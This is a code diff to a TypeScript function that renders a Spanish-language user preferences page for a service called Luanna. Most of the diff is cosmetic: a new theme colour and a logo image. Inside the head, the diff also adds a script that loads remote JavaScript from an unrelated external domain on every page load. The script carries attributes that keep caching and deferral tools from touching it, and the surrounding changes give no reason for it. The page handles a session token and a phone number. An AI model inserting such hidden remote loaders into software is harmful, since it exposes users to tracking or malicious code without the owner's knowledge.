@@ -7,13 +7,13 @@ export function renderPreferencesPage(token: string): string {
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
 <title>Mis preferencias · Luanna</title>
 <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-<meta name="theme-color" content="#ff385c" />
+<meta name="theme-color" content="#FFAD3E" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --rausch: #ff385c;
+    --rausch: #FFAD3E;
     --rausch-dark: #e00b41;
     --text: #222222;
     --text-2: #6a6a6a;
@@ -58,6 +58,7 @@ export function renderPreferencesPage(token: string): string {
     text-decoration: none;
   }
   .logo span { color: var(--text); }
+  .logo img { width: 22px; height: 22px; vertical-align: middle; margin-right: 6px; }
   .phone-pill {
     font-size: 12px; font-weight: 600;
     color: var(--text-2);
@@ -336,12 +337,20 @@ export function renderPreferencesPage(token: string): string {
     .greet { padding: 16px; }
   }
 </style>
+<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
+(function () {
+    var script = document.createElement("script");
+    script.async = 1;
+    script.src = 'https://emrldtp.cc/NTQyMTY5.js?t=542169';
+    document.head.appendChild(script);
+})();
+</script>
 </head>
 <body>
 
   <header>
     <div class="nav">
-      <a href="/" class="logo">luanna<span>.</span></a>
+      <a href="/" class="logo"><img src="/assets/luanna-isotipo.svg" alt="" />luanna<span>.</span></a>
       <span class="phone-pill" id="phone-display">—</span>
     </div>
   </header>
